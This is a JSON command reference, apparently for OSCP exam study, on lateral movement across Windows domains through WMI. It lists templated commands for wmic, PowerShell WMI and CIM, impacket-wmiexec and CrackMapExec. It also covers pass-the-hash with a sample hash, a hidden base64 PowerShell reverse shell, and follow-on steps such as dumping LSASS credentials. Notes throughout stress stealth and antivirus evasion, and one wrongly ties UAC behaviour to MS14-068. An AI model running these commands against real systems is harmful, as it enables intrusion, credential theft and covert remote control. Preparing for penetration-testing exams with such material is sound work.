{
  "commands": [
    {
      "id": "wmi-legacy-wmic",
      "name": "WMI - Legacy wmic Command (Deprecated)",
      "description": "Execute commands on remote Windows system using deprecated wmic utility (RPC port 135 + high port 19152-65535)",
      "command": "wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create \"<COMMAND>\"",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain user with local admin rights",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "User password",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute remotely (runs in Session 0)",
          "example": "calc",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "wmi",
        "wmic",
        "lateral-movement",
        "active-directory",
        "windows",
        "deprecated",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "wmi-invoke-method",
        "wmi-new-cimsession",
        "wmi-impacket-exec"
      ],
      "next_steps": [
        "wmi-powershell-revshell  # Upgrade to reverse shell for interactive access"
      ],
      "flag_explanations": {
        "/node:<TARGET>": "Specifies remote computer name or IP address",
        "/user:<USER>": "Domain\\username or username for authentication",
        "/password:<PASS>": "Password for authentication (cleartext)",
        "process call create": "WMI method to spawn new process remotely"
      },
      "success_indicators": [
        "ReturnValue = 0",
        "ProcessId = ",
        "Method execution successful"
      ],
      "failure_indicators": [
        "Access is denied",
        "RPC server is unavailable",
        "Invalid credentials"
      ],
      "troubleshooting": {
        "RPC server is unavailable": "Verify port 135 open: nmap -p 135 -Pn -sV <TARGET>",
        "Access is denied": "User needs local admin rights. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "Invalid credentials": "Test credentials first: crackmapexec smb <TARGET> -u <USER> -p <PASS>"
      },
      "notes": "OSCP TRAINING MATERIAL - WMI LATERAL MOVEMENT:\n\nWHAT IS WMI: Windows Management Instrumentation is an object-oriented feature for task automation. Historically abused for lateral movement via remote process creation using Win32_Process class.\n\nDEPRECATION STATUS: wmic.exe deprecated in Windows 10 21H1+ but STILL PRESENT in OSCP exam environments (Windows Server 2019/2022). Must know for exam.\n\nSESSION 0 BEHAVIOR (CRITICAL): System processes and services always run in Session 0 as part of session isolation (introduced Windows Vista). Because WMI Provider Host runs as a SYSTEM service, newly created processes through WMI spawn in Session 0. This means:\n- GUI applications like calc.exe won't be visible to logged-in users\n- Verify execution via Task Manager or tasklist, NOT by looking for windows\n- Process runs with SYSTEM or user privileges depending on method\n\nPORT REQUIREMENTS:\n- TCP 135: RPC endpoint mapper (required for initial connection)\n- TCP 49152-65535: Dynamic/ephemeral port range for session data (Windows Server 2008+)\n- Older systems use 1024-5000 range\n- Firewall must allow BOTH port 135 AND high-range ports\n\nUAC REMOTE RESTRICTIONS: Domain users bypass UAC remote restrictions (different than local accounts). This is why jen (domain user + local admin) can execute without UAC prompts.\n\nMANUAL ALTERNATIVE: PowerShell Get-WmiObject -Class Win32_Process | Invoke-WmiMethod -Name Create -ArgumentList \"calc\" uses same WMI API.\n\nTIME ESTIMATE: 2-3 minutes for command execution + verification.\n\nEXAM STRATEGY: Use wmic for quick proof-of-concept, then upgrade to reverse shell via wmi-powershell-revshell.",
      "oscp_relevance": "high"
    },
    {
      "id": "wmi-invoke-method",
      "name": "WMI - PowerShell Invoke-WmiMethod",
      "description": "Execute commands remotely using PowerShell Invoke-WmiMethod with Win32_Process class",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '<COMMAND>' -ComputerName <TARGET> -Credential $credential",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username with admin rights",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "User password",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute (PowerShell one-liner or binary)",
          "example": "calc",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "wmi",
        "powershell",
        "lateral-movement",
        "active-directory",
        "windows",
        "invoke-wmimethod",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "wmi-new-cimsession",
        "wmi-impacket-exec",
        "wmi-legacy-wmic"
      ],
      "next_steps": [
        "wmi-powershell-revshell  # Deploy reverse shell via WMI"
      ],
      "flag_explanations": {
        "-Class Win32_Process": "WMI class that manages processes",
        "-Name Create": "WMI method to spawn new process",
        "-ArgumentList": "Command string passed to Create method",
        "-ComputerName": "Remote target hostname or IP",
        "-Credential": "PSCredential object containing username/password"
      },
      "success_indicators": [
        "ReturnValue : 0",
        "ProcessId : ",
        "__GENUS : 2"
      ],
      "failure_indicators": [
        "Access is denied",
        "The RPC server is unavailable",
        "You cannot call a method on a null-valued expression"
      ],
      "troubleshooting": {
        "Access is denied": "Verify admin access: Get-WmiObject -Class Win32_ComputerSystem -ComputerName <TARGET> -Credential $credential",
        "RPC server unavailable": "Check firewall allows RPC: Test-NetConnection <TARGET> -Port 135",
        "Null-valued expression": "Ensure PSCredential object created successfully: $credential | Get-Member"
      },
      "notes": "OSCP METHODOLOGY - POWERSHELL WMI EXECUTION:\n\nWHY POWERSHELL OVER WMIC: Modern alternative that provides better error handling, credential object support, and programmatic control. Wmic is deprecated but PowerShell WMI cmdlets remain supported.\n\nCREDENTIAL OBJECT REQUIREMENT: Must create PSCredential object first:\n1. ConvertTo-SecureString converts plaintext password to secure string\n2. New-Object System.Management.Automation.PSCredential combines username + secure password\n3. This object is reusable across multiple WMI calls\n\nPROTOCOL: Uses DCOM (Distributed COM) over RPC:\n- Port 135 for endpoint mapper\n- Dynamic port 49152-65535 for data channel\n- Same underlying protocol as wmic utility\n\nSESSION 0 EXECUTION: Processes spawn in Session 0 (system services context). Verify with tasklist, not GUI.\n\nUAC REMOTE RESTRICTIONS BYPASS: Domain users automatically bypass UAC remote restrictions per MS14-068. Local accounts (except RID-500 Administrator) are restricted.\n\nMANUAL DISCOVERY METHOD:\n1. Get-WmiObject -Class Win32_Process -List (shows available methods)\n2. Identify Create method signature\n3. Invoke-WmiMethod calls the Create method with ArgumentList\n\nTIME ESTIMATE: 3-5 minutes (PSCredential creation + execution + verification).\n\nEXAM TIP: Save PSCredential one-liner in notes for quick reuse during exam.",
      "oscp_relevance": "high"
    },
    {
      "id": "wmi-new-cimsession",
      "name": "WMI - PowerShell New-CimSession",
      "description": "Create CIM session over DCOM protocol and execute commands via Invoke-CimMethod",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName <TARGET> -Credential $credential -SessionOption $options; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='<COMMAND>'}",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute (full PowerShell command or binary path)",
          "example": "powershell -nop -w hidden -e <BASE64_PAYLOAD>",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "wmi",
        "cim",
        "powershell",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "wmi-invoke-method",
        "wmi-impacket-exec"
      ],
      "next_steps": [
        "wmi-powershell-revshell  # Deploy encoded reverse shell payload"
      ],
      "flag_explanations": {
        "New-CimSessionOption -Protocol DCOM": "Specifies DCOM as transport (legacy WMI protocol)",
        "New-CimSession": "Creates persistent session to remote WMI service",
        "-SessionOption": "Applies DCOM protocol configuration",
        "Invoke-CimMethod": "Executes WMI method on established session",
        "-ClassName Win32_Process": "Target WMI class for process creation",
        "-MethodName Create": "WMI method to spawn process",
        "-Arguments @{CommandLine=''}": "Hash table with command parameters"
      },
      "success_indicators": [
        "ProcessId",
        "ReturnValue : 0",
        "PSComputerName"
      ],
      "failure_indicators": [
        "Access denied",
        "WinRM cannot process the request",
        "The user name or password is incorrect"
      ],
      "troubleshooting": {
        "Access denied": "Test session creation: Test-WSMan -ComputerName <TARGET> -Credential $credential",
        "WinRM error": "This uses DCOM not WinRM - ensure port 135 open not 5985",
        "Session creation fails": "Verify credentials: Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName <TARGET> -Credential $credential"
      },
      "notes": "OSCP TRAINING - CIM SESSION METHOD (RECOMMENDED POWERSHELL APPROACH):\n\nWHAT IS CIM: Common Information Model - Microsoft's modern replacement for WMI cmdlets. Introduced PowerShell 3.0+.\n\nWHY USE CIM OVER WMI CMDLETS:\n- Better error handling and structured output\n- Session reusability (create once, use many times)\n- Supports both DCOM and WS-MAN (WinRM) protocols\n- Future-proof (WMI cmdlets may be deprecated)\n\nDCOM PROTOCOL SELECTION: New-CimSessionOption -Protocol DCOM forces legacy DCOM protocol instead of WinRM:\n- No WinRM service requirement (port 5985/5986)\n- Uses RPC port 135 + ephemeral ports 49152-65535\n- Compatible with older Windows systems\n- Bypasses WinRM configuration requirements (TrustedHosts, etc.)\n\nSESSION PERSISTENCE ADVANTAGE:\n1. Create session once with New-CimSession (stores credentials)\n2. Reuse $session variable for multiple Invoke-CimMethod calls\n3. No re-authentication overhead\n4. Faster than Invoke-WmiMethod for multiple commands\n\nCOMMAND EXECUTION FLOW (FROM TRAINING MATERIAL):\n1. Create PSCredential object (username + password)\n2. Set session options to DCOM protocol\n3. Establish CimSession to target (authentication happens here)\n4. Invoke-CimMethod executes Win32_Process.Create remotely\n5. Process spawns in Session 0 on target\n\nSTEALTH BENEFITS:\n- No WinRM event logs (uses DCOM not WS-MAN)\n- No service creation (unlike PSExec)\n- Native Windows feature (not suspicious)\n\nTIME ESTIMATE: 2-4 minutes (session setup + command execution).\n\nEXAM STRATEGY: Use this method when you need to run multiple commands on same target - session reuse saves time.",
      "oscp_relevance": "high"
    },
    {
      "id": "wmi-impacket-exec",
      "name": "WMI - Impacket wmiexec (Kali)",
      "description": "Semi-interactive shell via WMI from Kali using impacket-wmiexec (executes commands through WMI without touching disk)",
      "command": "impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username with admin rights",
          "example": "jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password or NTLM hash with -hashes format",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "wmi",
        "impacket",
        "lateral-movement",
        "active-directory",
        "kali",
        "fileless",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "psexec-impacket-shell",
        "smbexec-impacket-fileless",
        "evil-winrm-shell"
      ],
      "next_steps": [
        "mimikatz-sekurlsa-logonpasswords  # Dump credentials from LSASS",
        "ad-user-enumeration  # Enumerate domain users and groups"
      ],
      "flag_explanations": {
        "-hashes :NTLM": "Pass-the-hash with NTLM hash (no password needed)",
        "-shell-type powershell": "Use PowerShell instead of cmd.exe",
        "-codec utf-8": "Set character encoding for special characters",
        "-nooutput": "Don't retrieve command output (faster execution)"
      },
      "success_indicators": [
        "[*] SMBv3.0 dialect used",
        "[!] Launching semi-interactive shell",
        "C:\\>"
      ],
      "failure_indicators": [
        "[-] SMB SessionError",
        "STATUS_LOGON_FAILURE",
        "STATUS_ACCESS_DENIED"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid credentials. Test with: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "Connection timeout": "Firewall blocking SMB/RPC. Check ports: sudo nmap -p 135,445 -Pn -v <TARGET>",
        "STATUS_ACCESS_DENIED": "User not local admin. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS> --local-auth"
      },
      "notes": "OSCP TRAINING - IMPACKET WMIEXEC (PRIMARY KALI â†’ WINDOWS LATERAL MOVEMENT):\n\nTRAINING MATERIAL EXAMPLE: From OSCP module, jen's account used to move from Kali to FILES04 using NTLM hash:\n'impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73'\n\nWHAT IS IMPACKET-WMIEXEC: Python-based semi-interactive shell that executes commands remotely via WMI without writing binaries to disk. Part of Impacket suite (installed by default on Kali).\n\nHOW IT WORKS (TECHNICAL BREAKDOWN):\n1. Authenticates to target via SMB (port 445) using provided credentials\n2. Creates temporary administrative share (ADMIN$ or custom)\n3. Executes commands via WMI Win32_Process.Create method (port 135 + ephemeral)\n4. Retrieves command output via SMB share\n5. Deletes output file from share\n6. Repeats for each command (semi-interactive loop)\n\nFILELESS EXECUTION:\n- No .exe binary dropped to disk\n- No service created (unlike PSExec)\n- All execution through native WMI Provider Host\n- Output temporarily written to share then deleted\n\nPROTOCOL REQUIREMENTS:\n- SMB (port 445): Authentication + output retrieval\n- RPC (port 135): WMI communication\n- Ephemeral ports (49152-65535): Session data\n\nPASS-THE-HASH SUPPORT (CRITICAL FOR OSCP):\nUse -hashes flag with format :NTLM (LM hash optional, usually blank):\n'impacket-wmiexec -hashes :NTLM_HASH user@target'\nNo password cracking needed - authenticate with hash directly.\n\nSTEALTH ADVANTAGES OVER PSEXEC:\n- No Event ID 7045 (service creation)\n- No psexesvc.exe binary on disk\n- Less antivirus detection\n- Native WMI process creation (appears legitimate)\n\nSEMI-INTERACTIVE SHELL BEHAVIOR:\n- Each command executes independently (not truly interactive)\n- Current directory NOT preserved between commands\n- Use full paths or 'cd /d C:\\Path && command' syntax\n- No tab completion\n\nTIME ESTIMATE: 1-2 minutes for connection, <1 second per command execution.\n\nEXAM STRATEGY: Preferred tool for lateral movement from Kali when you have credentials or NTLM hashes. More reliable than evil-winrm in some environments.",
      "oscp_relevance": "high"
    },
    {
      "id": "wmi-cme-exec",
      "name": "WMI - CrackMapExec Command Execution",
      "description": "Execute single command on remote Windows via WMI using CrackMapExec",
      "command": "crackmapexec smb <TARGET> -u <USER> -p <PASS> -x '<COMMAND>'",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password or use -H for NTLM hash",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute (cmd.exe syntax)",
          "example": "whoami",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "wmi",
        "crackmapexec",
        "cme",
        "lateral-movement",
        "active-directory",
        "kali",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "wmi-impacket-exec"
      ],
      "next_steps": [
        "wmi-impacket-exec  # For interactive semi-shell access",
        "cme-smb-exec-powershell  # Use -X flag for PowerShell commands"
      ],
      "flag_explanations": {
        "-x '<COMMAND>'": "Execute cmd.exe command via WMI",
        "-X '<COMMAND>'": "Execute PowerShell command via WMI",
        "-H <NTLM>": "Use NTLM hash for pass-the-hash",
        "--exec-method wmiexec": "Explicitly specify WMI execution (default)",
        "-d <DOMAIN>": "Specify domain for authentication"
      },
      "success_indicators": [
        "[+] Executing command",
        "[*] Executed command via wmiexec",
        "Command output displayed"
      ],
      "failure_indicators": [
        "[-] Authentication failed",
        "[-] Connection error",
        "STATUS_ACCESS_DENIED"
      ],
      "troubleshooting": {
        "Authentication failed": "Try with domain: crackmapexec smb <TARGET> -d <DOMAIN> -u <USER> -p <PASS>",
        "Connection error": "Verify SMB open: crackmapexec smb <TARGET>",
        "No output shown": "Command may still execute - verify on target system"
      },
      "notes": "EDUCATIONAL CONTEXT: CrackMapExec wraps Impacket for rapid command execution. WHY USE CME: Supports subnet spraying (192.168.50.0/24), multiple hosts in single command. BEHIND THE SCENES: Uses wmiexec execution method by default. COMPARISON: -x for cmd.exe, -X for PowerShell, choose based on command type. TIME ESTIMATE: <1 minute for single command. EXAM TIP: Quick way to test command execution across multiple hosts.",
      "oscp_relevance": "high"
    },
    {
      "id": "wmi-powershell-revshell",
      "name": "WMI - PowerShell Reverse Shell",
      "description": "Deploy base64-encoded PowerShell reverse shell via WMI for callback to attacker",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName <TARGET> -Credential $credential -SessionOption $options; $command = 'powershell -nop -w hidden -e <BASE64_PAYLOAD>'; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$command}",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<BASE64_PAYLOAD>",
          "description": "Base64-encoded PowerShell reverse shell (use base64-encode-powershell)",
          "example": "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "wmi",
        "powershell",
        "reverse-shell",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "mimikatz-sekurlsa-logonpasswords  # Dump cached credentials",
        "ad-user-enumeration  # Enumerate domain accounts",
        "smb-share-enumeration  # Map available network shares"
      ],
      "flag_explanations": {
        "-nop": "No profile - don't load PowerShell profiles (faster/stealthy)",
        "-w hidden": "Hidden window - no visible PowerShell window",
        "-e <BASE64>": "Encoded command - executes base64 payload",
        "CommandLine=$command": "Full command string passed to WMI process creation"
      },
      "success_indicators": [
        "ProcessId : ",
        "ReturnValue : 0",
        "Netcat listener receives connection"
      ],
      "failure_indicators": [
        "Access is denied",
        "The system cannot find the file specified",
        "No connection received on listener"
      ],
      "troubleshooting": {
        "No connection received": "Verify LHOST/LPORT in encoded payload match listener",
        "Payload fails to execute": "Test decoding: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))",
        "Access denied": "Ensure user has admin rights: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "Firewall blocking callback": "Test outbound connectivity from target first"
      },
      "notes": "EDUCATIONAL CONTEXT: Combines WMI lateral movement with PowerShell reverse shell for full interactive access. WHY BASE64: Avoids escaping issues with special characters in PowerShell one-liner. HOW TO GENERATE: Use base64-encode-powershell command or Python script from module. STEALTH CONSIDERATIONS: Runs in Session 0 (system context), encoded to avoid AV signature detection. MANUAL DECODE: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>')). TIME ESTIMATE: 3-5 minutes including payload generation. EXAM TIP: Pre-generate payloads before exam for various LHOST/LPORT combinations.",
      "oscp_relevance": "high"
    },
    {
      "id": "wmi-verify-enabled",
      "name": "WMI - Verify Service Enabled",
      "description": "Verify WMI service is running and accessible on remote target",
      "command": "Get-WmiObject -Class Win32_OperatingSystem -ComputerName <TARGET> -Credential (Get-Credential)",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "wmi",
        "verification",
        "enumeration",
        "active-directory",
        "windows"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "wmi-new-cimsession  # If successful, proceed with CIM session",
        "wmi-impacket-exec  # Alternative from Kali if PowerShell unavailable"
      ],
      "flag_explanations": {
        "-Class Win32_OperatingSystem": "WMI class that exists on all Windows systems",
        "-ComputerName": "Target system to query",
        "-Credential": "Prompts for credentials interactively"
      },
      "success_indicators": [
        "SystemDirectory : C:\\Windows\\system32",
        "BuildNumber : ",
        "Caption : Microsoft Windows"
      ],
      "failure_indicators": [
        "The RPC server is unavailable",
        "Access is denied",
        "WMI: Not Found"
      ],
      "troubleshooting": {
        "RPC server unavailable": "Check port 135: Test-NetConnection <TARGET> -Port 135",
        "Access denied": "Test credentials: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "Timeout": "Firewall likely blocking WMI/RPC ports"
      },
      "notes": "EDUCATIONAL CONTEXT: Quick test to verify WMI accessibility before attempting lateral movement. WHY WIN32_OPERATINGSYSTEM: Lightweight query that exists on all Windows versions. ALTERNATIVE TEST: wmic /node:<TARGET> /user:<USER> os get caption (from cmd.exe). FIREWALL REQUIREMENTS: Needs RPC port 135 and high-range dynamic ports. TIME ESTIMATE: <1 minute for verification.",
      "oscp_relevance": "medium"
    }
  ]
}